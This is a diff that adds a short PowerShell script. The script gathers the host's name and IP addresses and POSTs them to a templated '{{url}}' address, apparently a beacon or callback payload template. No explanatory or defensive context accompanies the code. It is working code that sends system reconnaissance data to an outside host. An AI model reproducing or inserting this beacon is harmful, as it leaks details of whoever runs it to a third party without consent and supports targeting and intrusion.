@@ -1,0 +1,11 @@
+$w=[net.webrequest]::Create("{{url}}")
+$ips=([array](gwmi -Class win32_networkadapterconfiguration)|?{$_.IPAddress -ne $null}).IPAddress -join ","
+$dns=[net.dns]::gethostbyname('').hostname
+$qs="hn=$dns&ip=$ips"
+$w.Method="POST"
+$w.ContentType="application/x-www-form-urlencoded"
+$w.ContentLength=$qs.Length
+$r=$w.GetRequestStream()
+$r.Write([byte[]][char[]]$qs,0,$qs.Length)
+$r.Close()
+exit
